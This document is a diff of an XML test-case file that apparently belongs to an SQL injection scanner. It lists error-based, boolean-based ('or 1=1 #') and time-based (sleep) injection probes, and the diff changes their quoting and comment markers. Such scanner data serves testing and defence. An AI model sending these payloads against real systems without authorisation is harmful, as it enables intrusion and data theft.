@@ -1,126 +1,126 @@
 <SQLiTestCase>
     <ErrorBasedTestCase num="3">
         <case id="1">
-            <inject>&apos;</inject>
+            <inject>'</inject>
             <identify>NULL</identify>
             <check>You have an error in your SQL syntax;</check>
         </case>
         <case id="2">
-            <inject>&quot;</inject>
+            <inject>"</inject>
             <identify>NULL</identify>
             <check>You have an error in your SQL syntax;</check>
         </case>
         <case id="3">
-            <inject>___</inject>
+            <inject/>
             <identify>NULL</identify>
             <check>You have an error in your SQL syntax;</check>
         </case>
     </ErrorBasedTestCase>
     <BoolBasedTestCase num="18">
         <case id="1">
-            <inject>&apos; and 1=1 </inject>
+            <inject>' and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="2">
-            <inject>&quot; and 1=1 </inject>
+            <inject>" and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="3">
-            <inject>&apos;) and 1=1 </inject>
+            <inject>') and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="4">
-            <inject>&quot;) and 1=1 </inject>
+            <inject>") and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="5">
-            <inject>2 and 1=1 </inject>
+            <inject>2 and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="6">
-            <inject>2) and 1=1 </inject>
+            <inject>2) and 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="7">
-            <inject>&apos; or 1=1 </inject>
+            <inject>' or 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="8">
-            <inject>&quot; or 1=1 </inject>
+            <inject>" or 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="9">
-            <inject>&apos;) or 1=1 </inject>
+            <inject>') or 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="10">
-            <inject>&quot;) or 1=1 </inject>
+            <inject>") or 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="11">
-            <inject>2 or 1=1 </inject>
+            <inject>2 or 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="12">
-            <inject>2) or 1=1 </inject>
+            <inject>2) or 1=1 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="13">
-            <inject>&apos; and 1=2 </inject>
+            <inject>' and 1=2 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="14">
-            <inject>&quot; and 1=2 </inject>
+            <inject>" and 1=2 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="15">
-            <inject>&apos;) and 1=2 </inject>
+            <inject>') and 1=2 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="16">
-            <inject>&quot;) and 1=2 </inject>
+            <inject>") and 1=2 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="17">
-            <inject>2 and 1=2 </inject>
+            <inject>2 and 1=2 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
         </case>
         <case id="18">
-            <inject>2) and 1=2 </inject>
+            <inject>2) and 1=2 #</inject>
             <inject2>NULL</inject2>
             <identify>NULL</identify>
             <check>NULL</check>
@@ -128,38 +128,38 @@
     </BoolBasedTestCase>
     <TimeBasedTestCase num="6">
         <case id="1">
-            <inject>&apos; or if(1=1, sleep(</inject>
-            <injectPost>), 0) </injectPost>
+            <inject>' or if(1=1, sleep(</inject>
+            <injectPost>), 0) #</injectPost>
             <identify>NULL</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="2">
-            <inject>&quot; or if(1=1, sleep(</inject>
-            <injectPost>), 0) </injectPost>
+            <inject>" or if(1=1, sleep(</inject>
+            <injectPost>), 0) #</injectPost>
             <identify>NULL</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="3">
-            <inject>&apos; or if(1=1, sleep(</inject>
-            <injectPost>), 0) </injectPost>
+            <inject>' or if(1=1, sleep(</inject>
+            <injectPost>), 0) #</injectPost>
             <identify>NULL</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="4">
-            <inject>&quot; or if(1=1, sleep(</inject>
-            <injectPost>), 0) </injectPost>
+            <inject>" or if(1=1, sleep(</inject>
+            <injectPost>), 0) #</injectPost>
             <identify>NULL</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="5">
-            <inject>&apos; or if(1=1, sleep(</inject>
-            <injectPost>), 0) </injectPost>
+            <inject>' or if(1=1, sleep(</inject>
+            <injectPost>), 0) #</injectPost>
             <identify>NULL</identify>
             <identifyPost>NULL</identifyPost>
         </case>
         <case id="6">
-            <inject>&quot; or if(1=1, sleep(</inject>
-            <injectPost>), 0) </injectPost>
+            <inject>" or if(1=1, sleep(</inject>
+            <injectPost>), 0) #</injectPost>
             <identify>NULL</identify>
             <identifyPost>NULL</identifyPost>
         </case>
